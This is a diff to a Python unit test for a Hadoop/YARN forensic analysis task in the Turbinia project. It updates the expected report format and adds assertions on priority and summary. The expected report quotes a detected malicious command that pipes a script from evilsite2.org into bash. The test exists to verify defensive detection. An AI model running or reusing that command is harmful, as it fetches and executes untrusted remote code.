@@ -17,6 +17,7 @@
 from __future__ import unicode_literals
 
 import os
+import textwrap
 import unittest
 
 from turbinia import config
@@ -26,28 +27,15 @@ from turbinia.workers import hadoop
 class HadoopAnalysisTest(unittest.TestCase):
   """Tests for HadoopAnalysisTask."""
 
-  _EXPECTED_REPORT = """Found suspicious commands!
-File: /../../test_data/bad_yarn_saved_task
-Command: "1533561022643*Bcurl https://evilsite2.org/aldnalezi/mygit/raw/master/ab.sh | bash0"
-
-All strings from Yarn Tasks:
-Strings for /../../test_data/bad_yarn_saved_task:
-hadoop
-default"
-EHDTS
-YARN_AM_RM_TOKEN
-APPLICATION_WEB_PROXY_BASE
-%/proxy/application_1526380001485_0125"
-MAX_APP_ATTEMPTS
-APP_SUBMIT_TIME_ENV
-1533561022643*Bcurl https://evilsite2.org/aldnalezi/mygit/raw/master/ab.sh | bash0
-YARNX
-dr.who 
-,(\x092
-Application application_1526380001485_0125 failed 2 times due to AM Container for appattempt_1526380001485_0125_000002 exited with  exitCode: 0
-Failing this attempt.Diagnostics: For more detailed output, check the application tracking page: http://apelcycluster-m:8088/cluster/app/application_1526380001485_0125 Then click on links to logs of each attempt.
-. Failing the application.8
-"""
+  # pylint: disable=line-too-long
+  _EXPECTED_REPORT = textwrap.dedent(
+      """\
+      #### **Found suspicious commands!**
+      * **Command:**
+      `1533561022643*Bcurl https://evilsite2.org/aldnalezi/mygit/raw/master/ab.sh | bash0`
+      Found in file:
+      `../../test_data/bad_yarn_saved_task`
+      * Extracted 15 strings from 1 file(s)""")
 
   def setUp(self):
     self.filedir = os.path.dirname(os.path.realpath(__file__))
@@ -60,5 +48,9 @@ Failing this attempt.Diagnostics: For more detailed output, check the applicatio
     task = hadoop.HadoopAnalysisTask()
     self.maxDiff = None
     # pylint: disable=protected-access
-    report = '\n'.join(task._AnalyzeHadoopAppRoot([self.test_file]))
-    self.assertEqual(report.replace(self.filedir, ''), self._EXPECTED_REPORT)
+    (report, priority, summary) = task._AnalyzeHadoopAppRoot([self.test_file],
+                                                             self.filedir)
+    report = '\n'.join(report)
+    self.assertEqual(priority, 10)
+    self.assertEqual(summary, 'Found suspicious commands!')
+    self.assertEqual(report, self._EXPECTED_REPORT)
